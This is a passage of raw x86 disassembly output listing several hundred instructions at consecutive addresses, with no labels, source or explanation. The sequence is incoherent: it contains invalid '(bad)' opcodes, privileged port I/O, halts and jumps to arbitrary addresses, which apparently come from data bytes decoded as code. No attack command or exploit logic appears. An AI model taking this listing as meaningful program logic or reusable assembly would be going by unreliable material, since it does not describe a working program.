  420271:	fdivp  st(5),st
  420273:	xchg   ecx,eax
  420274:	(bad)  
  420275:	std    
  420276:	sbb    eax,0xa4af63ef
  42027b:	mov    ds:0xbb3faa62,al
  420280:	add    al,0xd4
  420282:	out    0xb4,al
  420284:	nop
  420285:	mov    cl,al
  420287:	xor    DWORD PTR [edx+0x77e4f320],ebx
  42028d:	lods   al,BYTE PTR ds:[esi]
  42028e:	sub    al,dh
  420290:	mov    dl,0x5
  420292:	call   0xa6f13994
  420297:	lds    eax,FWORD PTR [ebp+edx*1-0x61]
  42029b:	(bad)  
  42029c:	or     eax,0x2f813422
  4202a1:	lods   al,BYTE PTR ds:[esi]
  4202a2:	and    DWORD PTR [ebp+0x29],eax
  4202a5:	(bad)  
  4202a6:	ror    ah,0xeb
  4202a9:	call   DWORD PTR [ebx+ebx*1+0x43]
  4202ad:	push   edi
  4202ae:	pop    eax
  4202af:	sbb    DWORD PTR ds:0x2ab9272f,esp
  4202b5:	pop    esi
  4202b6:	add    al,dl
  4202b8:	and    al,0xe1
  4202ba:	nop
  4202bb:	mov    edi,0x9ad128e7
  4202c0:	repz mov ebp,0x3d7f56ef
  4202c6:	xor    WORD PTR [ebx],ax
  4202c9:	cli    
  4202ca:	adc    BYTE PTR [edi+0x1c75cb97],bl
  4202d0:	or     dh,BYTE PTR [ebp+0x32]
  4202d3:	and    eax,0xcb85e42c
  4202d8:	dec    edx
  4202d9:	imul   ecx,DWORD PTR [edx-0x7aaba894],0x3680337c
  4202e3:	das    
  4202e4:	push   eax
  4202e5:	addr16 pop ss
  4202e7:	outs   dx,DWORD PTR ds:[esi]
  4202e8:	mov    al,ds:0x3cd536e3
  4202ed:	inc    edi
  4202ee:	sub    DWORD PTR [ecx-0x5c59eb5d],ebp
  4202f4:	adc    DWORD PTR [edx-0x405c926b],0xffffffdb
  4202fb:	int3   
  4202fc:	push   0x3549f32
  420301:	pop    ecx
  420302:	inc    edi
  420303:	xor    eax,0xd159cec5
  420308:	pop    ss
  420309:	dec    ecx
  42030a:	fisub  DWORD PTR [edx-0x7c]
  42030d:	sahf   
  42030e:	dec    ebx
  42030f:	xchg   edx,eax
  420310:	popa   
  420311:	mov    bl,0x34
  420313:	pop    ebx
  420314:	into   
  420315:	jecxz  0x42030a
  420317:	cwde   
  420318:	or     DWORD PTR [ecx+0x9],0xa6a7a8f7
  42031f:	and    edi,ecx
  420321:	cmp    ax,0x1e62
  420325:	pop    ebp
  420326:	jle    0x420304
  420328:	out    0x4,al
  42032a:	jge    0x4202f9
  42032c:	mov    dl,0x2e
  42032e:	mov    dh,0x4d
  420330:	jmp    0x591600f3
  420335:	int    0xbf
  420337:	int    0x53
  420339:	pop    ecx
  42033a:	in     eax,dx
  42033b:	dec    edi
  42033c:	or     esi,ebp
  42033e:	lock fild QWORD PTR [ebx+0x7c16b9ad]
  420345:	js     0x42039f
  420347:	ret    
  420348:	push   ebp
  420349:	pop    ds
  42034a:	push   es
  42034b:	and    BYTE PTR [esi-0x33359ddc],0x86
  420352:	dec    ebx
  420353:	scas   al,BYTE PTR es:[edi]
  420354:	push   ebp
  420355:	or     BYTE PTR [esi-0x1c],al
  420358:	sahf   
  420359:	retf   0x8cac
  42035c:	cmp    eax,0xddfdc1a6
  420361:	cmp    eax,esi
  420363:	iret   
  420364:	fcmovnbe st,st(2)
  420366:	aaa    
  420367:	adc    ecx,DWORD PTR [ecx-0x44]
  42036a:	pop    ss
  42036b:	out    0xf0,al
  42036d:	and    al,BYTE PTR [ebx]
  42036f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420370:	mov    al,ds:0xbc35cbb5
  420375:	in     al,dx
  420376:	and    edi,0xe514e140
  42037c:	or     al,BYTE PTR [edx]
  42037e:	jae    0x4203d3
  420380:	retf   
  420381:	dec    esi
  420382:	dec    edi
  420384:	mov    esp,0x43ecb995
  420389:	scas   eax,DWORD PTR es:[edi]
  42038a:	or     al,0xee
  42038c:	jae    0x420407
  42038e:	jo     0x420391
  420390:	cmp    ebx,DWORD PTR [ebx-0x5e]
  420393:	rol    BYTE PTR [ecx+0x41],0x49
  420397:	jmp    0x6c110b72
  42039c:	mov    eax,0x786574c4
  4203a1:	call   0xf3d5:0x83b12367
  4203a8:	jb     0x420359
  4203aa:	cmp    DWORD PTR [ebx-0x7eb15243],eax
  4203b0:	sub    ch,BYTE PTR [edi+0x58]
  4203b3:	jg     0x420387
  4203b5:	lahf   
  4203b6:	in     eax,dx
  4203b7:	retf   
  4203b8:	inc    edx
  4203b9:	in     eax,0x96
  4203bb:	nop
  4203bc:	cmp    ch,bl
  4203be:	or     eax,0x2b40133e
  4203c3:	aad    0x2d
  4203c5:	or     bl,BYTE PTR [edi]
  4203c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4203c8:	cmp    BYTE PTR [ecx+0x5e],ch
  4203cb:	jns    0x4203cc
  4203cd:	dec    esi
  4203ce:	mov    bl,0x9e
  4203d0:	add    al,0xf1
  4203d2:	and    BYTE PTR [esi],ah
  4203d4:	mov    ebx,0x10287e69
  4203d9:	sub    DWORD PTR cs:[eax-0x7d3b2e5e],esp
  4203e0:	in     al,0xed
  4203e2:	push   cs
  4203e3:	imul   edi,esp,0x76
  4203e6:	pop    ebp
  4203e7:	xor    ebp,DWORD PTR [ecx-0x317ba39a]
  4203ed:	add    BYTE PTR [ebp+0x16bfb07f],dl
  4203f3:	sbb    eax,0xa99884e5
  4203f8:	inc    eax
  4203f9:	daa    
  4203fa:	push   ds
  4203fb:	jmp    0x806c614c
  420400:	cs std 
  420402:	ror    DWORD PTR [esi-0x5fd1019d],cl
  420408:	inc    edi
  420409:	xchg   ebx,eax
  42040a:	imul   eax,esi,0x44b15758
  420410:	popf   
  420411:	fmul   st,st(7)
  420413:	xor    eax,0xe55fd7f7
  420418:	xchg   ecx,eax
  420419:	sub    eax,0x64520719
  42041e:	or     ebx,DWORD PTR ds:0x308f487d
  420424:	(bad)  
  420425:	(bad)  
  420426:	cmp    al,0x87
  420428:	retf   0xf134
  42042b:	cmp    al,0x64
  42042d:	dec    esi
  42042e:	ret    0x82ba
  420431:	(bad)  
  420432:	jmp    FWORD PTR [esi-0x66]
  420435:	inc    ebp
  420436:	mov    ah,BYTE PTR [edi+0x5a]
  420439:	jae    0x420466
  42043b:	mov    ss,ecx
  42043d:	sub    ebx,DWORD PTR [edi-0x4a]
  420440:	push   edx
  420441:	int    0x14
  420443:	or     eax,0xbfd142e6
  420448:	fild   WORD PTR [edx+eiz*4]
  42044b:	inc    ecx
  42044c:	test   al,0x98
  42044e:	test   edi,0xefec81a3
  420454:	jl     0x42045c
  420456:	aaa    
  420457:	or     eax,0x9ebfce94
  42045c:	cdq    
  42045d:	sub    eax,0xd251651c
  420462:	fisttp WORD PTR [eax+0x5a4d56cc]
  420468:	fadd   st(4),st
  42046a:	mov    ecx,0xfd7260bb
  42046f:	popa   
  420470:	sbb    cl,BYTE PTR [edx+0x34]
  420473:	mov    edi,0xa2ef24b9
  420478:	xchg   esi,eax
  420479:	push   es
  42047a:	lahf   
  42047b:	rcl    DWORD PTR [eax-0x3c82701],0x9
  420482:	xchg   edx,eax
  420483:	add    DWORD PTR [edi+0x6e],ebx
  420486:	pop    eax
  420487:	add    esp,DWORD PTR [edi+0x1e]
  42048a:	adc    eax,0xbc0e9752
  42048f:	(bad)  
  420490:	push   ds
  420491:	pop    ebx
  420492:	xor    eax,0x4c08db4c
  420497:	test   BYTE PTR [ebp+0x34],ch
  42049a:	mov    esi,0x860a8256
  42049f:	dec    edx
  4204a0:	data16 aaa 
  4204a2:	scas   eax,DWORD PTR es:[edi]
  4204a3:	pushf  
  4204a4:	into   
  4204a5:	xor    eax,0x23fb10b0
  4204aa:	cwde   
  4204ab:	inc    esp
  4204ac:	pop    es
  4204ad:	sbb    al,0x66
  4204af:	scas   eax,DWORD PTR es:[edi]
  4204b0:	test   dh,cl
  4204b2:	sub    al,0x2
  4204b4:	pop    edi
  4204b5:	mov    dh,0x78
  4204b7:	mov    bl,0xea
  4204b9:	sahf   
  4204ba:	push   esi
  4204bb:	ins    DWORD PTR es:[edi],dx
  4204bc:	(bad)  
  4204bd:	loop   0x4204cc
  4204bf:	adc    al,0xa
  4204c1:	or     ebx,DWORD PTR [ebx+0x25]
  4204c4:	aaa    
  4204c5:	push   ecx
  4204c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4204c7:	and    eax,DWORD PTR [ebx-0x53c56614]
  4204cd:	stc    
  4204ce:	ins    BYTE PTR es:[edi],dx
  4204cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4204d0:	sti    
  4204d1:	and    eax,0xbe5884fd
  4204d6:	in     eax,dx
  4204d7:	jmp    0x420514
  4204d9:	mov    ebx,0x9806a1db
  4204de:	xchg   esp,eax
  4204df:	xlat   BYTE PTR ds:[ebx]
  4204e0:	shr    BYTE PTR [eax-0x32],0x98
  4204e4:	pop    es
  4204e5:	cmp    BYTE PTR [edx+eax*4+0x179c9238],bl
  4204ec:	push   esp
  4204ed:	mov    ah,0x3e
  4204ef:	(bad)  
  4204f0:	(bad)  
  4204f1:	mov    al,ds:0x90b67f8b
  4204f6:	(bad)  
  4204f7:	aam    0xd8
  4204f9:	jle    0x4204e4
  4204fb:	das    
  4204fc:	mov    ds:0xb3db9306,eax
  420501:	pop    ds
  420502:	loop   0x4204da
  420504:	(bad)  
  420506:	out    dx,al
  420507:	data16 fucomip st,st(0)
  42050a:	inc    edx
  42050b:	and    eax,0x56c9b304
  420510:	mov    dh,0xab
  420512:	ins    BYTE PTR es:[edi],dx
  420513:	stc    
  420514:	sbb    BYTE PTR [edi-0x2a],bh
  420517:	adc    eax,ecx
  420519:	xor    eax,0x7a43ca9
  42051e:	jo     0x42050e
  420520:	cs ja  0x42050f
  420523:	pop    eax
  420524:	das    
  420525:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420526:	ja     0x420523
  420528:	push   eax
  420529:	and    DWORD PTR [ebx+0x2aa38c93],0x611b6ea1
  420533:	jo     0x4204c9
  420535:	ror    BYTE PTR [ecx+0x39dd76d2],cl
  42053b:	pusha  
  42053c:	daa    
  42053d:	xor    cl,BYTE PTR [ebx]
  42053f:	iret   
  420540:	xor    dh,BYTE PTR [edi]
  420542:	dec    esi
  420543:	fadd   st(0),st
  420545:	jns    0x420538
  420547:	jge    0x4204ce
  420549:	call   0x7d2c:0xec7a4df0
  420550:	not    BYTE PTR [esp+eiz*2]
  420553:	xchg   esi,eax
  420554:	(bad)  
  420555:	out    dx,al
  420556:	outs   dx,BYTE PTR ds:[esi]
  420557:	inc    edx
  420558:	xor    al,0xd2
  42055a:	or     BYTE PTR [ebp-0x4bb4de2],ch
  420560:	imul   ecx,DWORD PTR [edx],0x689a3492
  420566:	xor    al,0x96
  420568:	test   BYTE PTR ds:0x7a046448,bh
  42056e:	add    eax,0xefd03ab6
  420573:	mov    fs:0xc619e2f,al
  420579:	test   DWORD PTR [ebx-0x26557f69],edi
  42057f:	outs   dx,DWORD PTR ds:[esi]
  420580:	lahf   
  420581:	leave  
  420582:	pop    edx
  420583:	rcr    esi,1
  420585:	je     0x420567
  420587:	lahf   
  420588:	out    0xe3,al
  42058a:	mov    DWORD PTR [eax-0x18],esi
  42058d:	stos   BYTE PTR es:[di],al
  42058f:	iret   
  420590:	dec    ecx
  420591:	adc    BYTE PTR [eax+0x6cd78cd2],cl
  420597:	mov    ?,eax
  420599:	retf   0xf6ef
  42059c:	inc    ebx
  42059d:	inc    eax
  42059e:	imul   DWORD PTR [esi-0x49c53dae]
  4205a4:	jb     0x4205f7
  4205a6:	loop   0x4205c6
  4205a8:	aam    0xa3
  4205aa:	in     al,dx
  4205ab:	cli    
  4205ac:	pop    esp
  4205ad:	and    BYTE PTR [esi+edx*2],0x3a
  4205b1:	mov    ecx,0xef0116d
  4205b6:	mov    eax,0xc960da31
  4205bb:	mov    ah,0xa5
  4205bd:	ror    BYTE PTR [edx+ebp*4],0xea
  4205c1:	or     edx,DWORD PTR [ebp-0x29115ec4]
  4205c7:	sub    BYTE PTR [edi+0x2],bl
  4205ca:	shr    dl,cl
  4205cc:	iret   
  4205cd:	jmp    0x4205bf
  4205cf:	push   es
  4205d0:	mov    cl,0x76
  4205d2:	cs dec eax
  4205d4:	push   0x79
  4205d6:	xlat   BYTE PTR ds:[ebx]
  4205d7:	jns    0x4205ce
  4205d9:	dec    esp
  4205da:	dec    ecx
  4205db:	inc    eax
  4205dc:	stos   DWORD PTR es:[edi],eax
  4205dd:	xchg   ecx,ebx
  4205df:	jecxz  0x420584
  4205e1:	xor    dl,BYTE PTR [edi+0x913460f]
  4205e7:	das    
  4205e8:	mov    ds:0xfc5f7b1e,eax
  4205ed:	shr    BYTE PTR [esi-0x1c401524],cl
  4205f3:	pop    ebp
  4205f4:	jp     0x42065c
  4205f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4205f7:	pop    edx
  4205f8:	xlat   BYTE PTR ds:[ebx]
  4205f9:	push   cs
  4205fa:	outs   dx,BYTE PTR ds:[esi]
  4205fb:	mov    esp,0x85d2c01d
  420600:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420601:	pop    eax
  420602:	mov    edi,0xe96a2a9b
  420607:	fst    QWORD PTR [esi+0x21]
  42060a:	aad    0x26
  42060c:	das    
  42060d:	adc    eax,0x4ae64dba
  420612:	call   0x79d396c9
  420617:	mov    es,edi
  420619:	and    BYTE PTR [ebx-0x11],al
  42061c:	adc    al,0x7c
  42061e:	jnp    0x4205a9
  420620:	sbb    ebx,DWORD PTR ds:0x10a2
  420625:	repnz rcl DWORD PTR [eax+0x67db4036],1
  42062c:	dec    esp
  42062d:	pop    ds
  42062e:	xchg   ecx,eax
  42062f:	add    DWORD PTR [ecx],0x57
  420632:	cmc    
  420633:	add    al,0x3b
  420635:	pushf  
  420636:	jl     0x4205f9
  420638:	in     al,0xdf
  42063a:	xchg   DWORD PTR [esp+eiz*4],eax
  42063d:	inc    edi
  42063e:	mov    DWORD PTR [edx+ebx*8-0x4],0x3932c8a4
  420646:	es dec ecx
  420648:	cmp    cl,BYTE PTR [ebx+0x51]
  42064b:	lock fcom QWORD PTR [ecx-0x2efe7f44]
  420652:	neg    DWORD PTR [ecx+0x1e]
  420655:	inc    esp
  420656:	push   cs
  420657:	pushf  
  420658:	mov    ds:0x291021f,al
  42065d:	or     BYTE PTR [ebx+0x7c],ch
  420660:	push   eax
  420661:	or     al,0x77
  420663:	movsx  edi,BYTE PTR [eax]
  420666:	out    dx,al
  420667:	(bad)  
  420669:	push   edi
  42066a:	xchg   esp,eax
  42066b:	in     eax,0x9e
  42066d:	dec    edi
  42066e:	in     eax,0x9f
  420670:	cwde   
  420671:	inc    ecx
  420672:	test   BYTE PTR ds:0xa450ea4e,dl
  420678:	pop    ecx
  420679:	add    eax,0x3858940e
  42067e:	retf   0x1d9b
  420681:	out    dx,eax
  420682:	inc    edx
  420683:	pop    ebp
  420684:	cs es pusha 
  420687:	sbb    DWORD PTR [edx+0x45],0xffffff96
  42068b:	test   DWORD PTR [edi-0x78],edi
  42068e:	cwde   
  42068f:	push   0xffffffb7
  420691:	pop    ebp
  420692:	cmp    DWORD PTR [ecx],esi
  420694:	or     BYTE PTR [edx+0x2e],0xe5
  420698:	int    0xff
  42069a:	lods   eax,DWORD PTR ds:[esi]
  42069b:	or     eax,0x70374285
  4206a0:	xor    DWORD PTR [edi+eiz*8-0xc61d77],edi
  4206a7:	pop    eax
  4206a8:	inc    esp
  4206a9:	out    dx,eax
  4206aa:	pushf  
  4206ab:	jecxz  0x4206f5
  4206ad:	pop    cx
  4206af:	outs   dx,BYTE PTR ds:[esi]
  4206b0:	inc    ebx
  4206b1:	dec    eax
  4206b2:	hlt    
  4206b3:	add    BYTE PTR [ebp-0x15],ah
  4206b6:	pop    esi
  4206b7:	mov    eax,ds:0x9dfda241
  4206bc:	div    DWORD PTR [eax]
  4206be:	push   ss
  4206bf:	out    dx,eax
  4206c0:	pop    ecx
  4206c1:	enter  0x889e,0x3e
  4206c5:	popa   
  4206c6:	mov    bh,0x61
  4206c8:	fcomp  QWORD PTR ss:[ebp+0x7bd1340]
  4206cf:	adc    BYTE PTR [ebx+0x194efe8e],0xe0
  4206d6:	(bad)  
  4206d7:	call   0x19542031
  4206dc:	mov    al,bh
  4206de:	ror    bl,cl
  4206e0:	mov    cl,0xcd
  4206e2:	add    al,0x10
  4206e4:	cli    
  4206e5:	outs   dx,DWORD PTR ds:[esi]
  4206e6:	pop    ebp
  4206e7:	xor    edi,ebp
  4206e9:	adc    al,BYTE PTR [ebx]
  4206eb:	in     eax,0x52
  4206ed:	fbld   TBYTE PTR [esi]
  4206ef:	push   0x3f
  4206f1:	int3   
  4206f2:	push   ds
  4206f3:	out    0xef,al
  4206f5:	out    dx,al
  4206f6:	xchg   esp,eax
  4206f7:	loopne 0x4206f1
  4206f9:	jo     0x4206ff
  4206fb:	out    0x13,al
  4206fd:	mov    dl,0xdd
  4206ff:	or     eax,0x1969da99
  420704:	push   ebp
  420705:	add    DWORD PTR [edi+0x66e23d1a],ecx
  42070b:	pop    esi
  42070c:	add    cl,BYTE PTR [edi*4+0x6b578887]
  420713:	test   BYTE PTR [edi],0xc5
  420716:	xchg   edi,esi
  420718:	sbb    DWORD PTR [esi+0x42b8adbb],ebp
  42071e:	or     ecx,DWORD PTR [ebp+0x34]
  420721:	rcl    DWORD PTR [ebx+0x13c81865],cl
  420727:	in     eax,0x7f
  420729:	clc    
  42072a:	adc    DWORD PTR [esi-0x288502b4],ebp
  420730:	sahf   
  420731:	scas   eax,DWORD PTR es:[edi]
  420732:	pop    ds
  420733:	imul   ecx,DWORD PTR ds:0xd615c9e8,0x8bdc62b4
  42073d:	sub    DWORD PTR [edx-0x5],edi
  420740:	aas    
  420741:	arpl   dx,bp
  420743:	shr    DWORD PTR [edi+0x1],0x9
  420747:	in     al,dx
  420748:	ret    
  420749:	and    BYTE PTR [ecx+0x6593162d],bl
  42074f:	and    al,0x31
  420751:	daa    
  420752:	dec    eax
  420753:	icebp  
  420754:	or     edi,esi
  420756:	iret   
  420757:	daa    
  420758:	xchg   ah,ah
  42075a:	out    0xc6,eax
  42075c:	xchg   ebp,edx
  42075e:	pop    esi
  42075f:	mov    al,BYTE PTR [ecx-0x7a]
  420762:	push   ecx
  420763:	(bad)  
  420764:	cmc    
  420765:	ins    DWORD PTR es:[edi],dx
  420766:	cs sbb eax,0x85576b1e
  42076c:	out    0x8f,al
  42076e:	lahf   
  42076f:	mov    esi,edx
  420771:	dec    ecx
  420772:	add    dl,BYTE PTR [eax+0x11273847]
  420778:	wbinvd 
  42077a:	enter  0xd512,0xb9
  42077e:	push   esi
  42077f:	(bad)  
  420780:	pop    ds
  420781:	aaa    
  420782:	push   cs
  420783:	loop   0x420747
  420785:	hlt    
  420786:	push   esi
  420787:	jne    0x420783
  420789:	push   esi
  42078a:	imul   edi,edi,0x5c
  42078d:	mov    edx,0xc2852c67
  420792:	cs sub esp,ebx
  420795:	jl     0x42080e
  420797:	mov    cs,WORD PTR ss:[ecx-0x1e]
  42079b:	sub    DWORD PTR [edx],esp
  42079d:	outs   dx,BYTE PTR ds:[esi]
  42079e:	dec    ebp
  42079f:	mov    cl,0x4b
  4207a1:	popf   
  4207a2:	jo     0x420744
  4207a4:	and    BYTE PTR [esi],dh
  4207a6:	add    BYTE PTR [eax],ah
  4207a8:	sub    al,0xf7
  4207aa:	or     al,BYTE PTR [edx+eax*8-0x2ac03dd5]
  4207b1:	test   eax,0x1296d950
  4207b6:	cmp    eax,0x6188c840
  4207bb:	les    esi,FWORD PTR ds:[eax-0x52]
  4207bf:	adc    eax,ebx
  4207c1:	and    DWORD PTR [esi],edx
  4207c3:	shl    al,1
  4207c5:	jg     0x420829
  4207c7:	dec    ecx
  4207c8:	cdq    
  4207c9:	icebp  
  4207ca:	xor    DWORD PTR [ebp+eax*2+0x32fef0dc],esi
  4207d1:	push   edx
  4207d2:	sub    al,0x98
  4207d4:	xlat   BYTE PTR ds:[ebx]
  4207d5:	ret    
  4207d6:	pushf  
  4207d7:	cld    
  4207d8:	xchg   ebx,eax
  4207d9:	mov    ds:0x4bedc6ba,al
  4207de:	dec    esi
  4207df:	mov    al,0x7
  4207e1:	cld    
  4207e2:	shr    DWORD PTR [esi+0x6904a2e7],cl
  4207e8:	push   ecx
  4207e9:	shl    DWORD PTR [ebp-0x6dd939ee],0x5b
  4207f0:	or     BYTE PTR [edi],bl
  4207f2:	dec    ebx
  4207f3:	stos   BYTE PTR es:[edi],al
  4207f4:	xor    bl,BYTE PTR [eax+eiz*1]
  4207f7:	test   al,0xf5
  4207f9:	cmp    dl,BYTE PTR [esi+0x7d7534f5]
  4207ff:	hlt    
  420800:	mov    dh,0xa4
  420802:	adc    BYTE PTR [eax+0x2],ah
  420805:	pop    eax
  420806:	pop    ss
  420807:	ss jecxz 0x42079d
  42080a:	sbb    ebp,DWORD PTR [eax+0x5d]
  42080d:	mov    al,ds:0xee4c0294
  420812:	cmp    BYTE PTR [edi+0x8],0x76
  420816:	imul   ecx,eax,0xffffffe8
  420819:	mov    BYTE PTR [ebx+0x6fcae41],dl
  42081f:	cmp    BYTE PTR [ebx+0x4d],0x77
  420823:	pop    ecx
  420824:	cmp    DWORD PTR [esi-0x24],ebx
  420827:	dec    DWORD PTR [edx]
  420829:	mov    dl,0xa2
  42082b:	add    bl,BYTE PTR [edx]
  42082d:	fdivr  QWORD PTR [esi+0x68]
  420830:	xor    cl,BYTE PTR [ecx-0x7e4e1244]
  420836:	or     ch,bl
  420838:	div    cl
  42083a:	cdq    
  42083b:	dec    eax
  42083c:	call   0x7ec9:0x3285bcf2
  420843:	cmp    esp,DWORD PTR [ecx+ebx*8]
  420846:	push   ds
  420847:	adc    al,0x7e
  420849:	mov    al,0x85
  42084b:	(bad)  [esi+0x4844803a]
  420851:	or     al,0x7d
  420853:	int    0xb5
  420855:	loop   0x4208d6
  420857:	xchg   ax,ax
  420859:	adc    DWORD PTR [eax-0x39],edi
  42085c:	dec    ebp
  42085d:	jmp    0x4207df
  42085f:	adc    esp,DWORD PTR [edi-0xd9d1968]
  420865:	sbb    DWORD PTR [eax+0x6f8016cc],edx
  42086b:	and    cl,BYTE PTR [ebx+0x75e345a9]
  420871:	(bad)  [eax-0x33]
  420874:	xor    BYTE PTR [eax+0x6be372f7],0xa9
  42087b:	ja     0x42084f
  42087d:	push   edx
  42087e:	mov    ecx,0x814e9bb4
  420883:	mov    al,0x0
  420885:	dec    ebp
  420886:	inc    edx
  420887:	jecxz  0x4208da
  420889:	loopne 0x42084c
  42088b:	les    ebx,FWORD PTR ds:0xa3871d04
  420891:	test   eax,0x88ebe286
  420896:	test   DWORD PTR [edi-0x2d],esi
  420899:	rcl    BYTE PTR [ecx+0x18ae4db0],1
  42089f:	pop    edx
  4208a0:	jae    0x42091d
  4208a2:	mov    ebp,0x74dcec0f
  4208a7:	stos   DWORD PTR es:[edi],eax
  4208a8:	xor    BYTE PTR [ebx+0x54],bh
  4208ab:	xchg   BYTE PTR [edx-0x51f918f2],al
  4208b1:	in     al,0x58
  4208b3:	stos   BYTE PTR es:[edi],al
  4208b4:	aaa    
  4208b5:	mov    ah,0xf9
  4208b7:	sbb    eax,0xd2d6c322
  4208bc:	aaa    
  4208bd:	loopne 0x420841
  4208bf:	les    ebp,FWORD PTR [ecx]
  4208c1:	mov    dl,ch
  4208c3:	out    0x68,eax
  4208c5:	sbb    edx,DWORD PTR [esp+eiz*8-0x54783f64]
  4208cc:	(bad)  
  4208cd:	addr16 mov edx,0xe9071f08
  4208d3:	mov    al,BYTE PTR [ebx+0x34a88418]
  4208d9:	loopne 0x42086e
  4208db:	fcom   DWORD PTR [eax-0x52954ee]
  4208e1:	les    ebx,FWORD PTR [esi+0x12]
  4208e4:	hlt    
  4208e5:	ret    0x8dff
  4208e8:	les    eax,FWORD PTR [ecx+ebp*4]
  4208eb:	jmp    0x4208c8
  4208ed:	dec    esi
  4208ee:	bound  esi,QWORD PTR [ecx-0x3c]
  4208f1:	cli    
  4208f2:	leave  
  4208f3:	xchg   edx,eax
  4208f4:	push   esp
  4208f5:	jle    0x420974
  4208f7:	out    0xc6,eax
  4208f9:	sbb    eax,0x9e91f1c3
  4208fe:	xchg   DWORD PTR [eax+0x56],eax
  420901:	inc    eax
  420902:	mov    eax,ds:0xe8937849
  420907:	inc    ebp
  420908:	push   0xffffffb6
  42090a:	sar    bh,cl
  42090c:	push   0xa3b25bea
  420911:	add    edi,DWORD PTR ds:0x640f59b7
  420917:	rcr    BYTE PTR [ebx+0x4f51b9c6],1
  42091d:	mov    bh,0xdc
  42091f:	int    0x88
  420921:	sbb    al,0xa1
  420923:	sub    al,BYTE PTR [eax+0x6e831a6a]
  420929:	pusha  
  42092a:	jmp    0xaf873a30
  42092f:	jae    0x420992
  420931:	bound  edi,QWORD PTR [ebx-0x6459402]
  420937:	or     eax,0x34d20e62
  42093c:	pop    eax
  42093d:	outs   dx,BYTE PTR ds:[esi]
  42093e:	jns    0x42096d
  420940:	xchg   edx,eax
  420941:	inc    esp
  420942:	repnz fsubr st,st(5)
  420945:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420946:	adc    edi,ebx
  420948:	pop    esi
  420949:	jns    0x420998
  42094b:	mov    ch,bh
  42094d:	shl    BYTE PTR [esi-0x4bb4aa86],1
  420953:	lods   al,BYTE PTR ds:[esi]
  420954:	shl    dl,0x75
  420957:	mov    DWORD PTR [ebx-0x24],esi
  42095a:	and    dh,BYTE PTR [esi-0x5261c0ca]
  420960:	(bad)  
  420962:	push   ds
  420963:	loopne 0x420931
  420965:	(bad)  
  420966:	sbb    BYTE PTR [edx+esi*1],bh
  420969:	shl    BYTE PTR [ebx*2-0x7e3ad891],1
  420970:	shl    edi,1
  420972:	stos   DWORD PTR es:[edi],eax
  420973:	not    eax
  420975:	hlt    
  420976:	fisttp QWORD PTR [edi]
  420978:	mov    al,0x6d
  42097a:	jle    0x420985
  42097c:	or     eax,0xfb0d637d
  420981:	stos   DWORD PTR es:[edi],eax
  420982:	lods   eax,DWORD PTR ds:[esi]
  420983:	sub    DWORD PTR [edi],esi
  420985:	mov    dl,0xcc
  420987:	scas   eax,DWORD PTR es:[edi]
  420988:	rol    ebx,cl
  42098a:	retf   
  42098b:	addps  xmm0,XMMWORD PTR [edx+0x24d698ec]
  420992:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420993:	mov    bl,0xf1
  420995:	imul   ebp,DWORD PTR [eax],0xb1a96b5e
  42099b:	xchg   edi,eax
  42099c:	pop    edx
  42099d:	xor    al,0x68
  42099f:	call   0x3748dce3
  4209a4:	imul   esi,DWORD PTR [edi],0xfffffffd
  4209a7:	cmp    edx,ebp
  4209a9:	loope  0x420952
  4209ab:	cld    
  4209ac:	dec    ebx
  4209ad:	out    0x3b,eax
  4209af:	dec    esp
  4209b0:	add    al,0x0
  4209b2:	jb     0x4209d9
  4209b4:	mov    edx,0x17cc1944
  4209b9:	cmp    BYTE PTR [esi-0x6415140b],ch
  4209bf:	mov    WORD PTR [ebx-0x4a],?
  4209c2:	push   edx
  4209c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4209c4:	(bad)  
  4209c5:	xchg   ebx,eax
  4209c6:	cmp    DWORD PTR [esi+edi*1+0x60],ebx
  4209ca:	test   al,0xbc
  4209cc:	call   0x840:0x363a04a0
  4209d3:	outs   dx,BYTE PTR ds:[esi]
  4209d4:	sbb    ah,BYTE PTR [ecx]
  4209d6:	cmp    eax,DWORD PTR [ebx+0x24763021]
  4209dc:	out    0x24,eax
  4209de:	imul   esi,esp,0xffffffb4
  4209e1:	out    0x70,eax
  4209e3:	test   DWORD PTR [ebp-0x77],edx
  4209e6:	nop
  4209e7:	mov    esi,0xcc89d888
  4209ec:	inc    edi
  4209ed:	sbb    al,0x29
  4209ef:	les    edx,FWORD PTR fs:[ecx-0x129b4bf5]
  4209f6:	je     0x4209aa
  4209f8:	cmp    al,0x9f
  4209fa:	pusha  
  4209fb:	adc    BYTE PTR [esi],dh
  4209fd:	sub    eax,DWORD PTR [edx-0x6e]
  420a00:	jg     0x4209ff
  420a02:	icebp  
  420a03:	in     eax,0x61
  420a05:	std    
  420a06:	loop   0x4209a7
  420a08:	aas    
  420a09:	mov    cl,0x6c
  420a0b:	inc    edi
  420a0c:	xor    eax,0x9c6f3a1b
  420a11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a12:	dec    ebp
  420a13:	inc    edi
  420a14:	inc    ebp
  420a15:	pusha  
  420a16:	std    
  420a17:	or     ah,al
  420a19:	clc    
  420a1a:	es pop ebx
  420a1c:	sub    BYTE PTR [ecx],ah
  420a1e:	xchg   edx,eax
  420a1f:	xchg   ecx,eax
  420a20:	mov    cl,0xa9
  420a22:	call   0x86a4:0x4474ab80
  420a29:	push   0x33
  420a2b:	(bad)  
  420a2c:	sbb    ecx,DWORD PTR [edi]
  420a2e:	out    0x22,eax
  420a30:	out    dx,eax
  420a31:	inc    edi
  420a32:	stc    
  420a33:	nop
  420a34:	and    eax,0x138e6bd7
  420a39:	xor    eax,0x697c8ab0
  420a3e:	addr16 push ds
  420a40:	js     0x420a07
  420a42:	nop
  420a43:	dec    edx
  420a44:	mov    dh,BYTE PTR [eax]
  420a46:	pop    ebx
  420a47:	and    al,0x43
  420a49:	push   edi
  420a4a:	stc    
  420a4b:	aad    0x7a
  420a4d:	sti    
  420a4e:	adc    al,0xde
  420a50:	rol    DWORD PTR [ebp-0x38],0xef
